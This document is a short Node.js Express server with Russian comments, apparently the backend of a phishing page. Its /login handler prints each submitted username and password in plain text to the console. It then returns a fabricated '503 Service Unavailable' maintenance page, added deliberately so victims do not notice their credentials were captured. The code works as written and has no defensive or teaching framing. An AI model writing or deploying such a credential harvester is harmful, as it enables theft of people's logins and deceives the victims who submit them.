javascript
const express = require('express');
const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));

app.post('/login', (req, res) => {
    console.log(`[СЕРВЕР] Данные получены!`);
    console.log(`Логин: ${req.body.username}`);
    console.log(`Пароль: ${req.body.password}`);
    
    // Вставили новый ответ с имитацией недоступности сервера
    res.status(503).send(`
        <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 15%; color: #333;">
            <h1 style="font-size: 40px; margin-bottom: 10px;">503 Service Unavailable</h1>
            <p style="font-size: 18px; color: #666;">Сервер временно недоступен. Ведутся технические работы.</p>
            <hr style="width: 200px; border: 0; border-top: 1px solid #ccc; margin: 20px auto;">
            <p style="font-size: 14px; color: #999;">Пожалуйста, повторите попытку позже.</p>
        </div>
    `);
});

app.listen(PORT, () => {
    console.log(`=== СЕРВЕР РАБОТАЕТ НА ПОРТУ ${PORT} ===`);
});
